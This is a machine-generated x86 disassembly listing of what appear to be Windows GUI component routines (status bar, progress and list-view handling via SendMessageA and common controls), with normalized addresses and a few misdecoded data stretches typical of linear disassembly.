pop [ fs : 0x0 ]
add esp 0xc
sub_3ad8670
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x254 ]
call sub_3a64380
mov eax [ esi + 0x250 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ab2b34
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ad86ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_3ad82e0
mov edx esi
mov eax ebx
call sub_3ab3d30
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_3ab3c5c
cmp [ ebx + 0x25d ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x25e ] 0x0
jne r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov al 0x1
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ esi + 0x24 ]
or eax 0x2
or eax 0x1
mov [ esi + 0x24 ] eax
pop esi
pop ebx
retn
sub_3ad872f
add [ ebx - 0x75 ] dl
fdiv [ ebx ]
ror [ ebx + 0xa48e8c3 ] cl
add [ eax ] al
mov eax ebx
call sub_3ab3e5c
mov eax [ ebx + 0x70 ]
call sub_3a88d54
push eax
push 0x0
push 0x2001
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_3ad8d5c
cmp [ ebx + 0x258 ] 0x0
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
mov eax [ ebx + 0x258 ]
call sub_3a65730
push eax
push 0xff
push 0x401
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x1
push 0x409
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
sub_3ad87b8
push ebx
cmp [ eax + 0x272 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
mov al 0x1
pop ebx
retn
sub_3ad87dc
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x254 ]
call sub_3a89f04
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_3ad881c
push ebx
mov ebx eax
cmp dl [ ebx + 0x25c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x25c ] dl
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
push 0x0
movzx eax [ ebx + 0x25c ]
push eax
push 0x409
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3ad8858
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
dec al
je r-xdata
lea eax [ ebp - 0x1 ]
call sub_3aac488
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_3a65820
dec al
jne r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_3a65820
jmp r-xdata
sub_3ad88c0
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc7
call sub_3a6457c
push eax
lea edx [ ebx + 0x258 ]
xor ecx ecx
mov eax ebx
call sub_3ad8858
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x258 ]
call sub_3a65730
push eax
mov eax ebx
call sub_3ab0294
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0xff
push eax
push 0x401
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3ad8924
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x258 ]
mov edx esi
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x258 ]
mov edx esi
call sub_3a652f4
mov eax ebx
call sub_3ad88c0
sub_3ad8950
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_3ab6f84
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x25c ] 0x0
jne r-xdata
mov eax ebx
call sub_3ad88c0
mov eax [ ebx + 0x250 ]
call sub_3a7b21c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_3ad8d5c
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x250 ]
call sub_3ad8570
call sub_3ad840c
mov edx esi
mov eax [ ebx + 0x250 ]
call sub_3ad8570
cmp [ eax + 0x17 ] 0x0
je r-xdata
sub_3ad89c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3a7b21c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_3aaf4fc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor edx edx
call sub_3ad8570
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3a7b21c
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ad8504
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3ad8b22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3a7b21c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3a7b21c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx esi
call sub_3ad8570
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad8b29
mov eax [ ebp - 0x10 ]
call sub_3a64380
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_3ad8564
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx esi
call sub_3ad8570
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3a7b21c
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_3ad8570
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx esi
call sub_3ad8570
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_3ad8b29
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3a7b21c
dec eax
jle r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ad8d5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x250 ]
mov eax ebx
call sub_3a7b21c
mov edx eax
dec edx
mov eax ebx
call sub_3ad8570
mov edx [ ebp - 0x8 ]
call sub_3ad84f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor edx edx
call sub_3ad8570
mov edx [ ebp - 0xc ]
call sub_3ad84f4
sub_3ad8ba0
push ebx
mov ebx eax
cmp [ ebx + 0x25f ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_3aafc7c
mov edx 0xff000012
mov eax [ ebx + 0x68 ]
call sub_3a89220
sub_3ad8bd0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3ad8d33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad8d3a
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov edx ebx
mov eax [ esi + 0x250 ]
call sub_3ad8570
mov ebx eax
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
cmp [ ebx + 0x19 ] 0x0
je r-xdata
mov [ ebx + 0x19 ] 0x1
lea eax [ ebp - 0x15 ]
push eax
mov eax ebx
call sub_3a7aebc
push eax
push 0x40a
mov eax esi
call sub_3ab7c38
push eax
call __imp_SendMessageA
push 0xffffffff
lea eax [ ebp - 0x15 ]
push eax
mov eax esi
call sub_3ab7c38
push eax
call InvalidateRect
jmp r-xdata
mov [ ebx + 0x19 ] 0x0
xor edi edi
movzx eax [ ebx + 0x15 ]
sub al 0x1
jb r-xdata
mov edi 0x100
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_3ad8448
test al al
je r-xdata
mov edi 0x200
jmp r-xdata
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
or edi 0x400
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
call sub_3a65338
mov eax ebx
call sub_3ad8460
test al al
je r-xdata
or edi 0x1000
movzx eax [ ebx + 0x14 ]
dec al
je r-xdata
mov eax ebx
call sub_3ad8460
push eax
lea edx [ ebp - 0x4 ]
movzx ecx [ ebx + 0x14 ]
mov eax esi
call sub_3ad8858
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax r-xdata
call sub_3a65820
dec al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
mov eax ebx
call sub_3a7aebc
or edi eax
push edi
push 0x401
mov eax esi
call sub_3ab7c38
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax r-xdata
call sub_3a65820
jmp r-xdata
sub_3ad8d5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffdf4
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
add esp 0x20c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x250 ]
call sub_3a7b21c
mov [ esp + 0x4 ] eax
test bl bl
je r-xdata
mov ebp [ esp + 0x4 ]
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp + 0x4 ] 0x80
jle r-xdata
inc ebp
xor edi edi
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] 0x80
movzx ecx [ esp ]
mov edx edi
mov eax esi
call sub_3ad8bd0
inc edi
dec ebp
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov ebp [ esp + 0x4 ]
sub ebp 0x2
test ebp ebp
jl r-xdata
mov [ esp + 0xc ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
push 0x1
push 0x404
mov eax esi
call sub_3ab7c38
push eax
call __imp_SendMessageA
push r-xdata
push 0x0
push 0x401
mov eax esi
call sub_3ab7c38
push eax
call SendMessageA
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esp + eax * 4 + 0x8 ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x404
mov eax esi
call sub_3ab7c38
push eax
call SendMessageA
inc ebp
xor edi edi
lea ebx [ esp + 0xc ]
mov edx edi
mov eax [ esi + 0x250 ]
call sub_3ad8570
mov eax [ eax + 0x10 ]
add [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
inc edi
add ebx 0x4
dec ebp
jne r-xdata
sub_3ad8e71
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_3ab72a8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_3ad8ba0
cmp eax 0x2a
jne r-xdata
pop esi
pop ebx
retn
sub_3ad8ea0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_3a89f78
xor eax eax
push ebp
push sub_3ad8f96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_3a8a3c8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_3a8a25c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_3a89b20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_3a89c5c
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3ad8570
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad8f9d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
xor edx edx
call sub_3a8a3c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_3a8a234
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_3ad8fc0
push ebx
push esi
mov esi edx
mov ebx eax
mov cl 0x1
xor edx edx
mov eax ebx
call sub_3ad8d5c
mov edx esi
mov eax ebx
call sub_3ab5ae8
pop esi
pop ebx
retn
sub_3ad8fe0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_3a6457c
sub_3ad9020
push ebx
mov ebx eax
cmp dl [ ebx + 0x25f ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x25f ] dl
test dl dl
je r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax ebx
call sub_3ad8ba0
xor edx edx
mov eax ebx
call sub_3aafcb4
sub_3ad9088
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x260 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3a83da0
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
test al al
jne r-xdata
cmp [ ebx + 0x25c ] 0x0
jne r-xdata
mov edx [ esi + 0x7c ]
mov eax ebx
call sub_3ad8924
jmp r-xdata
mov eax [ ebx + 0x250 ]
call sub_3a7b21c
test eax eax
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor edx edx
mov eax [ ebx + 0x250 ]
call sub_3ad8570
mov edx [ esi + 0x7c ]
call sub_3ad84cc
sub_3ad9155
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3ab7614
mov dl 0x1
mov eax ebx
call sub_3ad9184
pop ebx
pop ebp
retn 0x8
sub_3ad9184
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] dl
mov edi eax
xor ebx ebx
mov dl 0x1
mov eax edi
call sub_3ac463c
mov esi eax
test esi esi
je r-xdata
cmp bl [ edi + 0x25e ]
je r-xdata
movzx eax [ esi + 0x271 ]
sub al 0x2
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x25e ] bl
cmp [ esp ] 0x0
je r-xdata
lea eax [ esp + 0x1 ]
push eax
lea ecx [ esp + 0x10 ]
mov edx [ edi + 0x4c ]
mov eax [ edi + 0x48 ]
call sub_3a67378
lea edx [ esp + 0x10 ]
mov ecx esi
mov eax edi
call sub_3ab2768
mov eax esi
call sub_3aaf4fc
cmp eax [ esp + 0x1 ]
jne r-xdata
sub al 0x3
jne r-xdata
mov eax edi
call sub_3ab4518
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_3aaf540
cmp eax [ esp + 0x5 ]
je r-xdata
mov bl 0x1
sub_3ad9214
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
mov [ esp ] eax
cmp [ ebx + 0x27a ] 0x0
je r-xdata
mov ecx [ ebx + 0x250 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
sub_3ad9268
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab5ed8
call sub_3abdd24
mov ecx esp
mov dl 0x1
call sub_3abe06c
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0xc ]
push eax
push 0x0
call sub_3abdd24
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x8 ]
call sub_3abdee8
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_3ad92c8
add esp 0xfffffff0
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x8 ] 0xffff
mov [ esp + 0xc ] 0x0
push esp
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
add esp 0x10
retn
sub_3ad9300
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x20
call sub_3ad82e0
mov [ edi + 0x250 ] al
mov ecx esi
xor edx edx
mov eax edi
call sub_3ab29f0
mov edx 0x96
mov eax edi
call sub_3aaf278
push 0x14
call GetSystemMetrics
mov edx eax
mov eax edi
call sub_3aaf2ac
xor eax eax
mov [ edi + 0x254 ] eax
mov [ edi + 0x258 ] 0x64
mov [ edi + 0x260 ] 0xa
mov [ edi + 0x264 ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad938c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab3d30
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_3ab3c5c
cmp [ ebx + 0x264 ] 0x1
jne r-xdata
call InitCommonControls
cmp [ ebx + 0x265 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x1
sub_3ad93e6
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_3ab3e5c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
movzx eax [ ebx + 0x254 ]
movzx edx [ ebx + 0x258 ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x401
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov eax [ ebx + 0x258 ]
push eax
mov eax [ ebx + 0x254 ]
push eax
push 0x406
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
jmp r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x404
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
mov edx [ ebx + 0x25c ]
mov eax ebx
call sub_3ad96ac
pop ebx
retn
sub_3ad948b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x14bd173d ]
std
inc [ eax + eax * 8 - 0x447fde8c ]
push eax
add al [ eax ]
add [ eax ] al
je r-xdata
mov eax [ ebx + 0x254 ]
pop ebx
retn
push 0x0
push 0x1
push 0x407
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3ad94c4
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x258 ]
pop ebx
retn
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x407
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3ad94fc
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x25c ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x403
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x408
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
jmp r-xdata
pop ebx
retn
sub_3ad954c
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10c ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ad9681
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi edi
jle r-xdata
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_3a64260
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
cmp esi [ ebx + 0x254 ]
jne r-xdata
test esi esi
jl r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
cmp edi [ ebx + 0x258 ]
je r-xdata
call sub_3ad92c8
cmp esi 0xffff
jg r-xdata
mov [ ebx + 0x254 ] esi
mov [ ebx + 0x258 ] edi
cmp [ ebx + 0x250 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad9688
lea eax [ ebp - 0x10c ]
call sub_3a652a0
retn
test edi edi
jl r-xdata
movzx eax si
movzx edx di
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x401
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
push edi
push esi
push 0x406
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
jmp r-xdata
cmp edi 0xffff
jle r-xdata
push 0x0
push esi
push 0x402
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
cmp esi [ ebx + 0x254 ]
jge r-xdata
sub_3ad96ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
test esi esi
jl r-xdata
mov [ ebx + 0x25c ] esi
pop esi
pop ebx
retn
push 0x0
push esi
push 0x402
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop esi
pop ebx
retn
call sub_3ad92c8
cmp esi 0xffff
jle r-xdata
sub_3ad96f8
push ebx
mov ebx eax
cmp edx [ ebx + 0x260 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x260 ] edx
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x404
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3ad9784
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax esi
call sub_3a7b21c
mov [ ebx + 0x28 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_3a7ae30
mov [ ebx + 0x24 ] 0x32
mov [ ebx + 0xc ] 0x0
or eax 0xffffffff
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x21 ] 0x3
xor edx edx
mov [ ebp - 0x1d ] edx
mov edx [ ebx + 0x24 ]
mov [ ebp - 0x19 ] edx
mov [ ebp - 0x9 ] eax
mov edi esi
mov eax edi
call sub_3ad9dd4
call sub_3ab7fd8
test al al
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax edi
call sub_3ad9dd4
call sub_3ab7c38
mov esi eax
mov eax ebx
call sub_3a7aebc
lea edx [ ebp - 0x21 ]
push edx
push eax
push 0x101b
push esi
call __imp_SendMessageA
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad9834
push ebx
push esi
push edi
push ebp
push ecx
call sub_3a6478c
mov [ esp ] dl
mov ebp eax
mov edi [ ebp + 0x4 ]
mov esi edi
mov eax edi
call sub_3ad9dd4
call sub_3ab7fd8
test al al
je r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebp
call sub_3a7ae68
mov eax esi
call sub_3ad9e10
cmp [ esp ] 0x0
jle r-xdata
mov eax [ ebp + 0x4 ]
call sub_3ad9dd4
call sub_3ab7c38
mov edi eax
mov eax ebp
call sub_3a7aebc
mov ebx eax
push 0x0
push ebx
push 0x101c
push edi
call __imp_SendMessageA
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a64734
sub_3ad98a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7abbc
push ebx
push r-xdata
push ebx
push sub_3ad9918
cmp [ ebx + 0x24 ] 0xffffffff
setle cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_3ad98ee
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_3a7f07c
mov eax ebx
call sub_3a7efcc
mov edx eax
mov eax esi
call sub_3ad9c1c
mov eax ebx
call sub_3a7f084
pop esi
pop ebx
retn
sub_3ad9918
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_3a81420
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_3a81354
mov eax ebx
call sub_3a81428
pop esi
pop ebx
retn
sub_3ad993c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3ad9dd4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_3ab7fd8
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2d9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x294 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_3a7cc20
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov edx [ ebp - 0x8 ]
mov [ edx + 0x294 ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x294 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d714
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3ad9a22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_3a80b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a64380
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x294 ]
call sub_3a7cbbc
retn
sub_3ad9a38
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3a7b21c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3a7b21c
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
